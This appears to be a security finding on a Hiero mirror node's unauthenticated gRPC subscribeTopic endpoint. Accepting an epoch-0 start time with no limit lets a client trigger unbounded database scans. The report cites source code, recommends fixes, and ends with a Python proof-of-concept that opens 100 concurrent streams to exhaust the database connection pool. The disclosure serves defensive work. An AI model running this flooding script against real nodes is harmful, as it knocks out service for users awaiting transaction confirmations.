### Title
Unbounded Historical Message Retrieval via Unauthenticated gRPC Subscription Enables Database Connection Pool Exhaustion

### Summary
Any unauthenticated external client can call `subscribeTopic` with `consensusStartTime` set to epoch 0 and no message limit. The server-side validation only rejects future start times, so epoch 0 passes all checks. `TopicMessageServiceImpl.subscribeTopic()` then issues an unbounded historical database retrieval for every such subscription, and with many concurrent connections the database connection pool is exhausted, blocking all other operations including transaction confirmations.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` [1](#0-0)  calls `toFilter()` which converts the client-supplied `consensusStartTime` directly into a `long` nanosecond value with no lower-bound enforcement: [2](#0-1) 

The resulting `TopicMessageFilter` has only two validation constraints on `startTime`:
- `@Min(0)` — epoch 0 satisfies this. [3](#0-2) 
- `isValidStartTime()` checks `startTime <= DomainUtils.now()` — epoch 0 is always in the past, so it always passes. [4](#0-3) 

In `TopicMessageServiceImpl.subscribeTopic()`, the historical retrieval is launched unconditionally: [5](#0-4) 

The result-count cap via `flux.take(filter.getLimit())` is only applied when `filter.hasLimit()` is true: [6](#0-5) 

`hasLimit()` returns `false` when `limit == 0` (the protobuf default): [7](#0-6) 

So when a client omits `limit` and sets `consensusStartTime = 0`, the server issues an unbounded database scan from the beginning of time with no cap. There is no per-client rate limit, no maximum concurrent subscriber enforcement, and no maximum lookback window anywhere in `GrpcProperties`: [8](#0-7) 

The subscriber count is only tracked as a metric gauge, not used to enforce any ceiling: [9](#0-8) 

### Impact Explanation
Each subscription with `startTime=0` and no limit holds a long-lived database connection/cursor streaming potentially millions of rows. With N concurrent such subscriptions, the database connection pool is exhausted. All other components sharing that pool — including REST API handlers that confirm new transactions — are starved of connections, causing a total service outage. This is a complete denial-of-service against the mirror node's ability to serve transaction confirmations.

### Likelihood Explanation
The gRPC endpoint requires no authentication or API key. The protobuf schema is public. An attacker needs only a gRPC client library and knowledge of any active topic ID (topic IDs are public on-chain). The attack is trivially scriptable: open dozens of concurrent gRPC streams with `consensusStartTime.seconds = 0` and no limit. It is fully repeatable and requires no special privileges or insider knowledge.

### Recommendation
Apply all of the following:

1. **Enforce a maximum lookback window**: In `TopicMessageFilter.isValidStartTime()`, reject `startTime` values older than a configurable maximum (e.g., 7 days), or add a `@Min` bound relative to current time.
2. **Enforce a server-side result cap**: When `filter.hasLimit()` is false, apply a configurable default maximum (e.g., 10,000 messages) before streaming historical results.
3. **Enforce a maximum concurrent subscriber limit**: Use `subscriberCount` to reject new subscriptions above a configurable threshold, returning `RESOURCE_EXHAUSTED` status.
4. **Add per-IP or per-client rate limiting** at the gRPC interceptor layer to limit subscription open rate.

### Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc
from com.hederahashgraph.api.proto.java import timestamp_pb2, basic_types_pb2

channel = grpc.insecure_channel("mirror-node-host:5600")
stub = consensus_pb2_grpc.ConsensusServiceStub(channel)

# Epoch-0 start time, no limit, targets any known active topic
query = consensus_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1234),
    consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
    # limit intentionally omitted (defaults to 0 = no limit)
)

# Open many concurrent streams
import threading
def flood():
    for msg in stub.subscribeTopic(query):
        pass  # hold connection open, consuming DB resources

threads = [threading.Thread(target=flood) for _ in range(100)]
for t in threads:
    t.start()
# DB connection pool exhausted; legitimate queries begin failing
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L62-65)
```java
        if (query.hasConsensusStartTime()) {
            long startTime = convertTimestamp(query.getConsensusStartTime());
            filter.startTime(startTime);
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L27-31)
```java

    @Min(0)
    @NotNull
    @Builder.Default
    private long startTime = DomainUtils.now();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L39-41)
```java
    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L48-51)
```java
    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-63)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L83-85)
```java
        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L88-91)
```java
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L17-30)
```java
public class GrpcProperties {

    private boolean checkTopicExists = true;

    @NotNull
    private Duration endTimeInterval = Duration.ofSeconds(30);

    @Min(1)
    private int entityCacheSize = 50_000;

    @NotNull
    @Valid
    private NettyProperties netty = new NettyProperties();
}
```
